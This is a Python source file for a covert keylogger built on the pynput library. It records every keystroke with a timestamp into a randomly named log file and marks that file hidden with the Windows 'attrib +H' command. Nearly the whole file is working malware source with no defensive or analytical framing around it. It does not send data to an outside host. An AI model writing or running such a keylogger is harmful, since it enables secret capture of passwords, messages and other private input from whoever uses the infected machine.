# Import the necessary libraries
from pynput import keyboard
import os
import random
import string
from queue import Queue
import datetime

# Generate a random file name for the log file
log_file = "".join(random.choices(
    string.ascii_letters + string.digits, k=10)) + ".txt"

# Define the key queue and the last write time variable
key_queue = Queue()
last_write_time = datetime.datetime.now()

# Create a function that will be called whenever a key is pressed
def kl_on_press(key):
    # Convert the key to a string
    key_str = str(key)

    # If the key is a special key (e.g. Shift, Alt, Ctrl),
    # then add the "key." prefix to the string
    if len(key_str) == 3:
        key_str = "key." + key_str

    # Put the key string in the key queue
    key_queue.put(key_str)


# Create a keyboard listener that will call the kl_on_press function
# whenever a key is pressed
listener = keyboard.Listener(on_press=kl_on_press)

# Start the keyboard listener   
listener.start()

# Hide the log file
os.system("attrib +H " + log_file)

# Create a loop that will run the keylogger until it is stopped
while True:
    # Check if the key queue has reached a certain size or if a certain time
    # interval has passed
    if key_queue.qsize() >= 10 or datetime.datetime.now() - last_write_time >= datetime.timedelta(seconds=10):
        # Open the log file in append mode
        with open(log_file, "a") as f:
            # Write the key press data from the key queue to the log file
            while not key_queue.empty():
                # Get the next key string from the key queue
                key_str = key_queue.get()

                # Generate a timestamp for the key press
                timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

                # Write the timestamp, followed by the key string, to the log file,
                # followed by a newline
                f.write(timestamp + " " + key_str + "\n")

        # Update the last write time
        last_write_time = datetime.datetime.now()
